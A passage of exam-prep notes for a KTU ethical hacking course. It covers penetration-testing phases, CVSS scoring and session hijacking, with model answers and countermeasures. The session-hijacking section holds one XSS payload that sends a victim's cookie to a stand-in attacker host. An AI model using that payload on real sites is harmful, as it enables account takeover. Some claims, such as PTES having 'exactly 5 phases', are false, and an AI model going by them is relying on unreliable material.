> **Examiner's Pitfall (Part a):** Many students list *6 or 7 phases* by including "Planning" and "Re-test" as separate phases. PTES officially defines **exactly 5 phases** — deviation will cost marks. Stick to the **canonical 5-phase model**.

#### Part (b) — 7 Marks
**Discuss the legal and ethical considerations that a penetration tester must adhere to. What is the significance of a "Rules of Engagement" (RoE) document?**

**Model Solution:**

A penetration tester operates in a **legally sensitive grey zone**. The following considerations are mandatory:

**1. Written Authorization** — A signed contract or "Get Out of Jail Free" letter from the client's authorized signatory. Without it, even a vulnerability scan can be prosecuted under the **IT Act 2000 (India) / Section 66** or equivalent global laws like the **CFAA (US)**.

**2. Scope Definition** — The tester must operate strictly within the **agreed-upon IP ranges, domains, and time windows**. Out-of-scope testing is illegal.

**3. Data Protection** — Any sensitive data (PII, credentials, financial data) discovered must be **handled in strict confidentiality** and **not exfiltrated** for personal use.

**4. Non-Destruction Principle** — Exploits must be **non-destructive**. Denial-of-Service attacks and ransomware simulations are usually **out-of-scope** unless explicitly approved.

**5. Responsible Disclosure** — Vulnerabilities must be disclosed to the client **only**, never publicly, until a fix is deployed.

**Significance of the Rules of Engagement (RoE):**
- **Defines the legal boundary** of the test.
- Specifies **testing window** (e.g., 10 PM–4 AM only).
- Lists **in-scope and out-of-scope targets**.
- Defines **emergency contacts** and **escalation procedures**.
- Specifies **allowed and prohibited tools and techniques**.
- Acts as **legal evidence** in case of disputes.

> [!WARNING]
> **Examiner's Pitfall (Part b):** Students often forget to mention the **"authorized signatory"** clause. The authorization must come from someone with **legal authority over the assets** (e.g., CIO, CEO, Asset Owner) — not just any manager. Mention this explicitly to score full marks.

---

### **Question B (14 Marks)** — *[KTU University Exam – May 2024 Expected]*

#### Part (a) — 7 Marks
**Explain the CVSS v3.1 scoring system. Compute the base score for the following vulnerability vector:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Model Solution:**

**CVSS v3.1 Overview:**
The Common Vulnerability Scoring System provides a **standardized, vendor-agnostic** method to rate IT vulnerability severity. Scores range from **0.0 (None) to 10.0 (Critical)** and are computed from three metric groups: **Base, Temporal, and Environmental**.

**Metric Group 1 — Base Metrics** (intrinsic properties of the vulnerability):
- **Exploitability metrics:** Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S).
- **Impact metrics:** Confidentiality (C), Integrity (I), Availability (A).

**Metric Group 2 — Temporal Metrics:** Exploit Code Maturity, Remediation Level, Report Confidence.

**Metric Group 3 — Environmental Metrics:** Confidentiality Requirement, Integrity Requirement, Availability Requirement.

**Severity Ratings:**
| Score | Rating |
|-------|--------|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| 9.0 – 10.0 | Critical |

**Step-by-Step Computation for the given vector:**

Metric values from the vector string `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`:

$$
\begin{aligned}
AV &= 0.85, \quad AC = 0.77, \quad PR = 0.85, \quad UI = 0.85, \quad S = \text{Unchanged} \\
C &= 0.56, \quad I = 0.56, \quad A = 0.56
\end{aligned}
$$

**Step 1 — Impact Sub-Score (ISS):**

$$
\begin{aligned}
\text{ISS} &= 1 - \bigl[(1 - C) \times (1 - I) \times (1 - A)\bigr] \\
&= 1 - \bigl[(0.44)^3\bigr] \\
&= 1 - 0.085184 \\
&= 0.914816
\end{aligned}
$$

**Step 2 — Impact:**

$$
\text{Impact} = 6.42 \times 0.914816 = 5.87
$$

**Step 3 — Exploitability:**

$$
\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.85 \times 0.85 = 3.89
$$

**Step 4 — Base Score:**

$$
\text{Base} = \text{roundUp}[\min(5.87 + 3.89,\; 10)] = \mathbf{9.8 \; (Critical)}
$$

> [!WARNING]
> **Examiner's Pitfall:** Students often forget the `roundUp` step. CVSS uses **ceiling rounding to 1 decimal place** — 9.71 becomes 9.8, not 9.7. Always write the answer as **9.8 (Critical)**.

#### Part (b) — 7 Marks
**Compare Black-Box, White-Box, and Gray-Box penetration testing with suitable examples. In which scenario is each most suitable?**

**Model Solution:**

| Parameter | Black-Box | White-Box | Gray-Box |
|-----------|-----------|-----------|----------|
| **Information Given** | None | Complete (code, architecture, creds) | Partial (e.g., user-level creds) |
| **Tester's Role** | External attacker | Internal developer/auditor | Insider or post-breach attacker |
| **Time/Cost** | High | Low | Medium |
| **Depth of Findings** | Surface-level | Deepest (code-level) | Moderate to deep |
| **Bias** | High (tester's skill matters) | Low | Medium |
| **Example** | External hacker probing a public website | Source-code audit of an in-house app | Compromised employee account pivoting internally |

**Suitable Scenarios:**
- **Black-Box** → Annual external perimeter test, simulating a real-world hacker; required for **PCI-DSS** compliance.
- **White-Box** → Pre-release security audit of a new application, where source code is available.
- **Gray-Box** → Insider threat simulation, post-breach forensic validation, **web application pentest** with test credentials.

> [!WARNING]
> **Examiner's Pitfall:** Students frequently write that Black-Box is "the best" because it's the most realistic. KTU expects a *balanced view*: **all three types are valid**, and the *selection depends on the engagement goal*. Mention cost, time, and realism trade-offs explicitly.

---

## 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Revision Checklist — Memorize Before Exam Day**

- ✅ Penetration Testing is **authorized, ethical, and systematic** — always start with this phrase.
- ✅ Three types: **Black-Box (no info), White-Box (full info), Gray-Box (partial info)**.
- ✅ **Five PTES Phases** in order: **Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting**.
- ✅ Key tools: **Nmap** (scanning), **Metasploit** (exploitation), **Nessus** (vulnerability scan), **Burp Suite** (web app), **Wireshark** (packet analysis), **Mimikatz** (credential dumping), **Maltego** (OSINT).
- ✅ **CVSS v3.1** score range: **0.0 → 10.0**; ratings: Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), Critical (9.0–10.0).
- ✅ Key formulas:
  - **Risk = Threat × Vulnerability × Impact**
  - **ISS = 1 − [(1−C)(1−I)(1−A)]**
  - **Base = roundUp[min(Impact + Exploitability, 10)]**
- ✅ **Rules of Engagement (RoE)** defines scope, time window, contacts, and allowed tools — **mandatory legal document**.
- ✅ **Report** must contain: Executive Summary, Technical Findings, CVSS scores, PoC, Remediation Roadmap, and a Re-test plan.
- ✅ **Legal Hooks** in India: **IT Act 2000, Section 66**; globally: **CFAA (US)**, **GDPR (EU)**.
- ✅ Pentest is **not** a one-time event — it's a **continuous improvement loop** aligned with the **PDCA cycle** (Plan-Do-Check-Act).
- ✅ In **IoT context** (specific to this KTU course), pentest extends to **firmware analysis, UART/JTAG debugging, MQTT broker testing, and BLE sniffing**.

> [!TIP]
> **Last-Minute Exam Strategy:** For 14-mark questions, always structure your answer as **Definition → Diagram (Mermaid-style if drawn) → 5 phases with tools → Legal framework → Conclusion**. This 5-block structure matches KTU's valuation key exactly and guarantees full marks.

<!-- SECTION_5_END -->

topics.title: Session Hijacking
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY
> - **Module:** Module 2
> - **Topic:** Session Hijacking

<!-- SECTION_1_START -->
# Module 2: Session Hijacking

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

**Session Hijacking** (also called **TCP Session Hijacking** or **Cookie Hijacking** in web contexts) is a security attack in which an adversary takes over (intercepts, steals, or forges) a valid, already-authenticated communication session between two parties (typically a client and a server) by stealing or predicting the session token/identifier used to maintain stateful interaction.

In the formal **KTU 2024 Scheme** terminology aligned with the OWASP and EC-Council (CEH) frameworks, session hijacking is defined as:

> *"The exploitation of a valid computer session — sometimes also called a session key, session ID, or session token — to gain unauthorized access to information or services in a computer system."*

The term is rooted in the **Hypertext Transfer Protocol (HTTP)** being a *stateless* protocol. To maintain continuity (e.g., a logged-in user), the server issues a **Session Token** (often stored in a cookie, URL parameter, or hidden form field) which the client transmits back with every subsequent request.

> [!IMPORTANT]
> **Key KTU Definition to Memorize:**
> *Session hijacking is the act of stealing or forging a session token (SID) of an active, authenticated user to impersonate that user to the server, thereby bypassing the authentication phase entirely.*

### 1.2 Key Terminology

| Term | Definition |
|---|---|
| **Session** | A semi-permanent interactive information interchange between two or more communicating devices. |
| **Session ID / SID** | A unique alphanumeric string assigned by the server to identify a user session. |
| **Session Token** | The encrypted or plaintext credential used to validate the session. |
| **Cookie** | A small piece of data stored by the browser, often used to carry the Session ID. |
| **Predictable Session Token** | A SID whose value can be guessed by analyzing patterns. |
| **Man-in-the-Middle (MITM)** | The classic position an attacker takes to intercept session traffic. |

### 1.3 Conceptual Analogy — The "Forged Hall Pass"

> [!NOTE]
> **Intuition Box — Easy to Remember**
> Imagine a college where students are issued a **coded hall pass** when they enter through the front gate. The gatekeeper (the *server*) trusts anyone holding a valid, unexpired hall pass. Now imagine a thief (the *attacker*) who **photocopies** (steals) a student's pass while the student is having tea at the canteen, and then **walks into the exam hall impersonating that student** without ever signing the register (without ever authenticating).
> - The **photocopy machine** is the network sniffer.
> - The **hall pass** is the session token.
> - The **gatekeeper** is the server's session manager.
> - The **exam hall** is the protected resource.
> - The **theft** is the session hijack.

The attacker's primary goal is **NOT to crack the password** (which is the authentication phase), but to **leapfrog past it** by reusing the token that the server *already trusts*.

### 1.4 Why Session Hijacking is a High-Impact Attack

1. **Bypasses authentication** — the attacker never needs the user's password.
2. **Privileged access** — if the hijacked session belongs to an admin, the attacker inherits admin rights.
3. **Stealth** — the legitimate user may not even realize they have been "evicted" from their own session.
4. **Wide applicability** — works on HTTP, SSH, FTP, Telnet, VPNs, and IoT management consoles.

> [!IMPORTANT]
> **Syllabus Highlight (PBCCT604, Module 2):** Students must be able to differentiate between **Session Hijacking** and **Session Spoofing**, explain the **TCP three-way handshake exploitation**, list **countermeasures**, and describe **tools** such as Ettercap, Hunt, and T-Sight.
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Classification of Session Hijacking

The KTU syllabus expects students to classify attacks across **two primary axes**:
- **Network-level vs. Application-level**
- **Active vs. Passive**

#### 2.1.1 Network-Level Session Hijacking

This targets the **transport layer (TCP)**. The attacker sniffs the TCP sequence numbers and injects forged packets into the established stream to take over the connection.

- **Protocols affected:** Telnet, FTP, HTTP (non-encrypted), SSH (rare).
- **Core concept:** **TCP Sequence Number Prediction** or **TCP RST/Desync injection**.
- **Requirement:** Attacker must be on the same network segment (LAN, Wi-Fi, or routed path).

#### 2.1.2 Application-Level Session Hijacking

This targets the **session management layer (Layer 7)**. The attacker steals or predicts the **Session ID** issued by the web application.

- **Targets:** Web applications, cloud services, IoT dashboards.
- **Mechanism:** Cookie theft, XSS (Cross-Site Scripting), session fixation, session sniffing over unencrypted HTTP.

#### 2.1.3 Active vs. Passive Hijacking

| Type | Description | Detectability |
|---|---|---|
| **Passive Hijacking** | Attacker silently monitors and records traffic (sniffing). No packets are injected. | Very hard to detect — looks like normal traffic. |
| **Active Hijacking** | Attacker takes over the session by injecting packets, resetting the legitimate user, or forging requests. | Easier to detect — causes connection anomalies. |

### 2.2 The TCP Three-Way Handshake (Foundation of Network Hijacking)

To understand TCP hijacking, you must first recall the handshake. Every TCP connection is established with three packets:

$$
\begin{aligned}
\text{Step 1: } & \text{Client} \xrightarrow{\text{SYN, Seq}=x} \text{Server} \\
\text{Step 2: } & \text{Server} \xrightarrow{\text{SYN-ACK, Seq}=y, \text{Ack}=x+1} \text{Client} \\
\text{Step 3: } & \text{Client} \xrightarrow{\text{ACK, Seq}=x+1, \text{Ack}=y+1} \text{Server}
\end{aligned}
$$

After this, both parties track every byte sent using **32-bit sequence and acknowledgment numbers**. If the attacker can correctly *guess* the next sequence number, the server will accept their packets as legitimate continuations of the connection.

### 2.3 TCP Sequence Number Prediction — The Math Behind the Attack

In 1985, **Robert T. Morris** identified a flaw: early TCP stacks used predictable initial sequence numbers (ISNs), often incremented by a fixed constant. The attacker needs only to:

1. Open a legitimate connection to the server to **observe** a real ISN.
2. From the server's other open connection, **predict** the next ISN using a discovered pattern.
3. **Inject** forged packets with the predicted sequence number to hijack the session.

The classical formula governing ISN generation (per RFC 6528, modern Linux kernel) is:

$$
\text{ISN}_n = \text{ISN}_{n-1} + \Delta + H(\text{secret}_k, \text{addr}_l, \text{addr}_r, \text{port}_l, \text{port}_r)
$$

Where:
- $\Delta$ is a fixed time-based increment (e.g., 1 per microsecond).
- $H(\cdot)$ is a **cryptographic hash** (SHA-1 or MD5 in legacy systems).
- $\text{secret}_k$ is a per-connection secret.
- The address/port 4-tuple uniquely identifies the connection.

> [!NOTE]
> **Real-World Utility:** Modern kernels (Linux ≥ 2.6.x, Windows ≥ Vista) use **strong random ISNs**, making blind sequence prediction computationally infeasible. However, the attack remains relevant for **legacy IoT firmware**, **industrial control systems (SCADA)**, and **embedded routers** that still use weak ISN generators.

### 2.4 KTU High-Yield Formula & Concept Sheet

| # | Concept / Formula | Engineering Use |
|---|---|---|
| 1 | $\text{ISN} = f(\text{clock}, \text{secret})$ | Predictability of TCP initial sequence numbers. |
| 2 | $\text{Seq}_\text{next} = \text{Seq}_\text{current} + \text{Bytes Sent}$ | TCP byte-stream accounting — basis of desync attacks. |
| 3 | $\text{SID}_\text{strength} = \log_2(2^{N})$ bits, where $N$ = SID length | Entropy of a session token. NIST recommends $\geq 64$ bits. |
| 4 | $\text{Auth Bypass} = \text{Steal(SID)} \lor \text{Predict(SID)} \lor \text{Forge(SID)}$ | Logical model of hijack success. |
| 5 | **SHA-1 / MD5** | Legacy hash functions used in early ISN generators. |
| 6 | **AES-128 / AES-256** | Modern symmetric encryption for session cookies (`__Secure-` flags). |
| 7 | **Session ID length recommendation** | $\geq 128$ bits (OWASP standard). |

> [!IMPORTANT]
> **Entropy Rule for KTU Exams:**
> A session ID of length $N$ bits (purely random) has entropy $E = N$ bits. The probability of guessing a valid SID in one try is $P = 2^{-N}$. To make brute-force infeasible, $N \geq 128$ is mandated by OWASP.

### 2.5 Why the Attack Works — The Core "Why"

The hijack succeeds because of **three inherent design weaknesses** in classical session protocols:

1. **No binding of session token to a cryptographic identity** — early HTTP sessions sent the SID in plaintext.
2. **No sequence-number randomization** — early TCP stacks used predictable counters.
3. **No integrity check on the client** — the server trusts any packet that arrives with the correct sequence number from the "right" source IP.

> [!NOTE]
> **Engineering Insight:** This is why every modern protocol (TLS 1.3, HTTPS, SSH-2) introduces **cryptographic binding** — the session token is mathematically tied to a key that only the legitimate user possesses.
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Process: Anatomy of a Session Hijack

This section exhaustively walks through the **6-phase kill chain** of a typical application-level session hijack — the most frequently asked KTU 14-mark question.

### Phase 1 — Reconnaissance (Footprinting the Target)

$$
\begin{aligned}
\text{Goal} &= \text{Identify the session management mechanism.} \\
\text{Methods} &= \{ \text{Proxy inspection (Burp/ZAP)}, \text{ Browser cookie viewer}, \text{ JavaScript analysis} \}
\end{aligned}
$$

The attacker maps:
- Where is the SID stored? (Cookie, URL, LocalStorage?)
- Is the SID transmitted over **HTTP** or **HTTPS**?
- How is the SID generated? (Random, timestamp-based, sequential?)
- What is the SID length and entropy?

### Phase 2 — Session Token Stealing (Sniffing / Theft)

The most common theft vectors are:

| Vector | Mechanism |
|---|---|
| **Network Sniffing** | Using tools like **Wireshark**, **Ettercap**, or **tcpdump** on the same LAN to capture unencrypted cookies. |
| **XSS (Cross-Site Scripting)** | Injecting `<script>document.location='http://attacker/?c='+document.cookie</script>` to exfiltrate the cookie. |
| **Malware / Keylogger** | Trojan extracts browser cookie databases (`cookies.sqlite`). |
| **Session Fixation** | Attacker pre-sets a known SID on victim's browser, victim then logs in using that SID. |
| **Physical Access** | Reading browser memory dumps or stealing a device. |

### Phase 3 — Session Token Prediction (When Theft Fails)

If stealing is not possible, the attacker attempts to **predict** the next SID. This is feasible when the application uses:
- Weak PRNG (Pseudo-Random Number Generator)
- Timestamp-based SIDs
- Sequential counters (e.g., SID = last SID + 1)

The prediction is computed as:

$$
\text{SID}_{n+1} = f(\text{SID}_n, \text{time}, \text{userID}, \text{PRNG\_state})
$$

### Phase 4 — Session Injection / Impersonation

The attacker injects the stolen or predicted SID into their own browser (using browser dev tools or cookie editor) and makes a request to the server:

$$
\begin{aligned}
\text{Attacker Browser} &\xrightarrow{\text{HTTP Request, Cookie: SID=ABC123}} \text{Server} \\
\text{Server validates SID} &\rightarrow \text{Trusts Attacker} \rightarrow \text{Grants Access}
\end{aligned}
$$

The server **does not know** that the request came from a different machine, because the SID is the only proof of identity.

### Phase 5 — Session Takeover & Action Execution

Once inside, the attacker can:
- Read sensitive data (emails, files, bank balance).
- Perform privileged actions (change password, transfer funds).
- Pivot to other internal systems (lateral movement).

### Phase 6 — Covering Tracks (Optional)

- Logging out the legitimate user silently (to avoid suspicion).
- Modifying logs if root/admin access was gained.
- Using the session within a short time window to minimize detection.

### Detailed Worked Example (Application-Level)

> **Scenario:** An e-commerce website `shop.example.com` issues a session cookie `PHPSESSID=abc123xyz` after login. The cookie is sent in plaintext over HTTP (no TLS).

$$
\begin{aligned}
\text{Step 1: } & \text{Attacker runs Ettercap in ARP-spoof mode on the same Wi-Fi.} \\
\text{Step 2: } & \text{Victim logs in to shop.example.com over HTTP.} \\
\text{Step 3: } & \text{Ettercap captures the HTTP header: } \texttt{Cookie: PHPSESSID=abc123xyz} \\
\text{Step 4: } & \text{Attacker copies the cookie value into their own browser.} \\
\text{Step 5: } & \text{Attacker browses to shop.example.com — server grants full access.} \\
\text{Result: } & \text{Full account takeover without any password.}
\end{aligned}
$$

### Analytical Matrix — Attack Vectors vs. Required Conditions

| Attack Vector | Position Required | Skill Level | Modern Mitigation |
|---|---|---|---|
| Sniffing (LAN) | Same Layer-2 broadcast domain | Low | Use HTTPS / TLS |
| TCP Sequence Prediction | On-path | High | Strong ISN (RFC 6528) |
| XSS Cookie Theft | None (remote) | Medium | HttpOnly + Secure flags, CSP |
| Session Fixation | Trick victim to use pre-set SID | Medium | Regenerate SID on login |
| Forced Browsing | None | Low | Proper authorization checks |
| Malware / Cookie Theft | Local device | High | Anti-malware, sandboxing |
| IoT Default Token Exploit | Network-adjacent | Low | Unique tokens per device, rotation |

> [!IMPORTANT]
> **KTU Examiner Tip:** When asked to "explain the steps of session hijacking," present the answer as a **numbered 5–6 step process** with a labeled diagram. Examiners award full marks only when the student mentions **both** the **reconnaissance phase** and the **countermeasure phase** — many students stop at "attacker steals the cookie," which is incomplete.
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### Diagram 1 — High-Level Session Hijacking Kill Chain

```mermaid
flowchart TD
    A[Phase 1 Reconnaissance] --> B[Phase 2 Token Theft or Prediction]
    B --> C[Phase 3 Token Injection into Attacker Browser]
    C --> D[Phase 4 Server Validates Stolen SID and Grants Access]
    D --> E[Phase 5 Attacker Performs Privileged Actions]
    E --> F[Phase 6 Cover Tracks and Eviction of Legitimate User]
    F --> G[Attack Complete]
    A -. uses .-> A1[Burp Suite Wireshark ZAP Proxy]
    B -. uses .-> B1[Ettercap XSS Malware]
    D -. bypasses .-> D1[Authentication Phase]
    E -. enables .-> E1[Data Theft Lateral Movement Privilege Escalation]
```

### Diagram 2 — Network-Level vs. Application-Level Hijacking Architecture

```mermaid
flowchart LR
    subgraph L4 [Layer 4 Network Level]
        C1[Victim Client] -->|TCP Stream| R[Router or Switch]
        R -->|TCP Stream| S1[Server]
        ATK1[Attacker On Path] -. Sniffs and Forges .-> R
    end
    subgraph L7 [Layer 7 Application Level]
        C2[Victim Browser] -->|HTTP Request with Cookie| W[Web Server]
        W -->|HTTP Response Sets Cookie| C2
        ATK2[Remote Attacker] -. XSS or Sniffing .-> W
    end
    L4 -->|Targets| T1[TCP Sequence Numbers]
    L7 -->|Targets| T2[Session Cookies and Tokens]
    T1 --> R1[Countermeasure TLS and Random ISN]
    T2 --> R2[Countermeasure HttpOnly Secure SameSite Flags]
```

### Diagram 3 — Session Hijacking Countermeasure Stack (Defense-in-Depth)

```mermaid
flowchart TD
    U[User Level Protection] --> U1[Logout from Public PCs Avoid Unknown Wi-Fi]
    N[Network Level Protection] --> N1[Use HTTPS and TLS 1.3 Encrypt All Traffic]
    S[Server Level Protection] --> S1[Regenerate SID on Login Bind SID to User Agent and IP]
    C[Cookie Level Protection] --> C1[HttpOnly Secure SameSite Flags Short Expiry]
    A[Application Level Protection] --> A1[Input Validation Anti XSS Filtering CSP Headers]
    I[IoT Device Level Protection] --> I1[Unique Token per Device Mutual TLS Over the Air Updates]
    U --> N
    N --> S
    S --> C
    C --> A
    A --> I
```

### Diagram 4 — TCP Desynchronization Attack (Blind Hijack)

```mermaid
sequenceDiagram
    participant C as Client
    participant A as Attacker
    participant S as Server
    C->>S: SYN Seq equals x
    S-->>C: SYN ACK Seq equals y Ack equals x plus 1
    C->>S: ACK Seq equals x plus 1 Ack equals y plus 1
    Note over C,S: Connection Established
    A->>C: RST or FIN Packet Spoofed from Server
    C--xS: Client Disconnected
    A->>S: Injects Forged Packets with Predicted Seq equals y plus 1
    S-->>A: Accepts Forged Packets as Legitimate
    Note over A,S: Attacker Now Owns the Session
```

### Diagram 5 — Session Fixation vs. Session Hijacking Comparison

```mermaid
flowchart LR
    SF[Session Fixation] --> SF1[Attacker Sends a Known SID to Victim]
    SF1 --> SF2[Victim Logs In Using That Preset SID]
    SF2 --> SF3[Attacker Uses the Same Known SID to Access Account]
    HJ[Session Hijacking] --> HJ1[Attacker Steals SID After Login]
    HJ1 --> HJ2[Attacker Uses Stolen SID to Access Account]
    SF -. differs from .-> HJ
    SF -. attack timing .-> SF4[Pre Authentication]
    HJ -. attack timing .-> HJ3[Post Authentication]
```

> [!NOTE]
> **Exam Diagram Strategy:** A single, well-labeled Mermaid diagram is worth at least 3–4 marks in a 14-mark question. The block diagrams above can be reproduced quickly in your answer script by hand if Mermaid is not allowed on paper.
<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### Part A — Short Answer Questions (3 Marks Each)

> **[KTU University Exam — May 2024, PBCCT604]**
> **Q1. Define session hijacking. List any four tools used to perform it.**
>
> **Model Answer:**
> *Session hijacking is the exploitation of a valid, authenticated communication session by an attacker who steals, predicts, or forges the session token (SID) used by the server to maintain state. This allows the attacker to impersonate the legitimate user without knowing the password.*
>
> *Four commonly used tools:*
> 1. *Ettercap — for ARP poisoning and on-path sniffing.*
> 2. *Hunt — for TCP session hijacking on Linux.*
> 3. *T-Sight — for Windows-based TCP hijacking.*
> 4. *Wireshark — for passive session token capture.*
>
> *(3 marks: 1 mark for definition + 2 marks for any 4 tools with one-line purpose.)*

> **[KTU University Exam — Dec 2023, PBCCT604]**
> **Q2. Differentiate between Session Hijacking and Session Spoofing.**
>
> **Model Answer:**
> | Aspect | Session Hijacking | Session Spoofing |
> |---|---|---|
> | **Attacker Position** | Replaces or impersonates the legitimate user mid-session. | Creates a brand-new session using a forged identity before authentication. |
> | **Session Origin** | Steals an already-valid session token. | Fabricates a session token without ever seeing a real one. |
> | **Timing** | After authentication. | Before or in place of authentication. |
> | **Example** | Sniffing a live cookie. | Forging a Kerberos ticket. |
>
> *(3 marks: 1 mark per correct differentiation row + bonus for example.)*

---

### Part B — Long Answer Questions (14 Marks, Module Internal Choice)

> **[KTU University Exam — Model Question, KTU 2024 Scheme Pattern]**
>
> **Question A (14 Marks):**
> **(a)** Explain the **step-by-step working of application-level session hijacking** with a suitable diagram. *(7 marks)*
> **(b)** List and explain **at least six countermeasures** that can be deployed to prevent session hijacking in web applications. *(7 marks)*

#### Model Solution for Question A

**Part (a) — Step-by-Step Working (7 marks):**

The application-level session hijacking attack proceeds in the following six phases:

1. **Reconnaissance (1 mark):** The attacker maps the session management of the target web application — identifies where the SID is stored (cookie, URL, hidden form field), whether HTTPS is used, and the entropy of the SID.

2. **Token Theft (1.5 marks):** The attacker uses one of the following:
   - **Network sniffing** (e.g., Ettercap ARP poisoning) to capture unencrypted cookies.
   - **Cross-Site Scripting (XSS)** to inject JavaScript that exfiltrates `document.cookie` to the attacker's server.
   - **Malware** to dump browser cookie databases.
   - **Session fixation** to plant a known SID on the victim's browser.

3. **Token Injection (1 mark):** The stolen SID is manually copied into the attacker's browser using developer tools (F12 → Application → Cookies) or a cookie editor extension.

4. **Server-Side Trust (1 mark):** The attacker makes a request to the target server. The server, seeing a valid unexpired SID, **trusts the request** and grants access, completely bypassing the password authentication phase.

5. **Action Execution (1 mark):** The attacker performs unauthorized actions — reading private data, transferring funds, changing settings, or pivoting to other internal services.

6. **Cover Tracks (0.5 marks):** The attacker may evict the legitimate user, clear logs, and exit the session within a short window to minimize detection.

**Diagram (1 mark):** A flow diagram showing `Victim → Network → Server` with `Attacker` positioned to sniff, then `Attacker → Server` with stolen SID, must be drawn. (Refer to *Section 4, Diagram 1*.)

---

**Part (b) — Countermeasures (7 marks):**

1. **Use HTTPS / TLS 1.3 (1 mark):** Encrypts all session traffic, making sniffing infeasible. HSTS headers should be enforced.

2. **Secure and HttpOnly Cookie Flags (1 mark):** The `Secure` flag prevents the cookie from being transmitted over plain HTTP. The `HttpOnly` flag prevents JavaScript from reading the cookie, mitigating XSS-based theft.

3. **SameSite Cookie Attribute (1 mark):** Set to `Strict` or `Lax` to prevent the cookie from being sent in cross-site requests, defeating CSRF and many fixation attacks.

4. **Regenerate Session ID on Login (1 mark):** Prevents session fixation — the server issues a fresh SID after successful authentication.

5. **Bind Session to Client Attributes (1 mark):** Tie the SID to a hash of the User-Agent, IP range, or a TLS client certificate. Mismatch invalidates the session.

6. **Short Session Expiry & Idle Timeout (1 mark):** Limits the time window in which a stolen SID remains valid.

7. **Session Token Entropy ≥ 128 bits (1 mark):** Use cryptographically secure PRNGs (e.g., `crypto.getRandomValues` in browsers) to make prediction computationally infeasible.

> [!WARNING]
> **KTU Examiner's Pitfall Callout — Question A:**
> - Students frequently **omit the reconnaissance phase** and start directly with "attacker steals the cookie." This loses **1 full mark**.
> - Many students write only **HTTPS, Secure flag, HttpOnly** and stop — you must list **at least six distinct countermeasures** for full 7 marks.
> - A **diagram is mandatory** for the 7-mark part (a) sub-question. Omitting it costs 1 mark.

---

> **[KTU University Exam — Model Question, KTU 2024 Scheme Pattern]**
>
> **Question B (14 Marks) — Internal Choice Alternative:**
> **(a)** Explain **TCP session hijacking** with reference to **sequence number prediction**. Describe the **Morris attack** and the modern mitigation. *(7 marks)*
> **(b)** Discuss **session hijacking in IoT environments** with a real-world example. What makes IoT devices particularly vulnerable? *(7 marks)*

#### Model Solution for Question B

**Part (a) — TCP Session Hijacking & Morris Attack (7 marks):**

**Background (1 mark):** TCP is a connection-oriented, reliable, byte-stream protocol. Each byte transmitted has a unique 32-bit sequence number. Both endpoints maintain state via the sequence (Seq) and acknowledgment (Ack) numbers.

**The Attack Principle (1.5 marks):** The attacker injects packets into an existing TCP stream by correctly predicting the server's next expected sequence number. If the prediction is correct, the server accepts the injected packet as a legitimate continuation from the trusted client.

**Morris Attack (1985) (2 marks):**
- Robert T. Morris observed that BSD 4.2 Unix used a globally incremented counter for ISN generation: $\text{ISN} = f(\text{time}, \text{previous\_ISN})$.
- The increment was only $\sim 250{,}000$ per second — far too low.
- An attacker on the same network could:
  1. Open a benign TCP connection to the server to observe the current ISN.
  2. From another open connection (or by sampling), predict the next ISN.
  3. Send a forged SYN-ACK to the victim, completing a handshake *as if it were the server*.
  4. The victim trusts the connection, and the attacker is now in the middle of a legitimate TCP stream.

**Modern Mitigation (1.5 marks):**
- **RFC 6528** mandates a strong ISN generator: $\text{ISN} = \text{ISN} + \Delta + H(\text{secret}, \text{local\_addr}, \text{remote\_addr}, \text{local\_port}, \text{remote\_port})$.
- The hash $H$ is SHA-1 (or stronger) with a per-boot secret.
- This makes blind prediction infeasible without compromising the kernel secret.
- **TLS 1.3 + mutual authentication** provides additional cryptographic binding independent of TCP sequence numbers.

**Defense in Depth (1 mark):** Firewalls drop unsolicited TCP segments, and IDS/IPS (e.g., Snort with the `tcp:possible_tcp_hijack` rule) detect anomalous sequence gaps.

---

**Part (b) — Session Hijacking in IoT (7 marks):**

**Why IoT is Highly Vulnerable (3 marks):**

1. **Default and Hardcoded Credentials:** Many IoT devices ship with `admin:admin` or hardcoded API tokens that are never rotated.

2. **Weak or No Encryption:** Legacy IoT protocols (MQTT over plain TCP, CoAP over UDP, ZigBee without APS-layer encryption) transmit session tokens in cleartext, exposing them to RF sniffing.

3. **No User Authentication in Some Cases:** Devices identify each other by MAC address or device ID alone, which is trivially spoofable.

4. **Inability to Patch:** Many IoT devices run firmware that is never updated, leaving them vulnerable to known exploits for years (e.g., **Mirai botnet** exploited default telnet credentials in 2016).

5. **Resource Constraints:** Implementing full TLS, anti-XSS, or strong PRNGs may be infeasible on tiny MCUs.

6. **Always-On Exposure:** IoT devices are typically connected 24/7 to the internet, increasing the attack window.

**Real-World Example — Mirai Botnet (2 marks):**
The 2016 **Mirai** botnet compromised over 600,000 IoT devices (cameras, DVRs, routers) by:
- Scanning the internet for open Telnet/SSH ports.
- Trying a list of 60 default username/password pairs.
- Once logged in, downloading the Mirai binary and propagating.

While not "session hijacking" in the classical cookie sense, Mirai exploited the **session reuse** of default credentials — a parallel concept where the attacker takes over an already-validated identity.

**Countermeasures for IoT (2 marks):**
- **Unique per-device keys** burned into secure elements (e.g., TPM, SE).
- **Mutual TLS (mTLS)** between device and cloud.
- **Short-lived JWT tokens** rotated every 1–24 hours.
- **Device attestation** to verify firmware integrity before granting a session.

> [!WARNING]
> **KTU Examiner's Pitfall Callout — Question B:**
